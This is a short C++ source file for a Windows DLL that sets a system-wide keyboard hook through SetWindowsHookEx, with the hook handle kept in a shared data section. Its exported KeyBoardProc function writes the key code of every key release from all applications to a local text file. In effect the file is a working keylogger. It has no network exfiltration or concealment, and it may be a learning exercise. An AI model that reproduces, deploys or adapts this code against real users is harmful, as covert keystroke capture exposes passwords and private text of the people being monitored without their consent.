// HookLib.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"


#include <windows.h>
#include "string.h"
#include "stdio.h" 
HINSTANCE hInst;



#pragma data_seg("hookdata")

HHOOK oldkeyhook=0;

#pragma data_seg()



#pragma comment(linker,"/SECTION:hookdata,RWS")



#define DllExport extern "C"__declspec(dllexport)


DllExport LRESULT CALLBACK KeyBoardProc(int nCode,WPARAM wParam, LPARAM lParam );
DllExport void InstallHook(int nCode);
DllExport void EndHook(void);



BOOL WINAPI DllMain(HINSTANCE hInstance,ULONG What,LPVOID NotUsed)
{
	switch (What)
	{
	case DLL_PROCESS_ATTACH:
		hInst = hInstance;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}


void InstallHook(int nCode)

{
	oldkeyhook = SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)KeyBoardProc,hInst,0);
}



DllExport LRESULT CALLBACK KeyBoardProc(int nCode,WPARAM wParam, LPARAM lParam )
{
	WPARAM j;
	FILE *fp;

	if(lParam&0x80000000)
	{
		j = wParam;
		fp=fopen("g://hook//key.txt","a"); 
		fprintf(fp,"%4d",j);
		fclose(fp);

	}
	return CallNextHookEx(oldkeyhook,nCode,wParam,lParam);
}

void EndHook(void)
{
	UnhookWindowsHookEx(oldkeyhook);
}
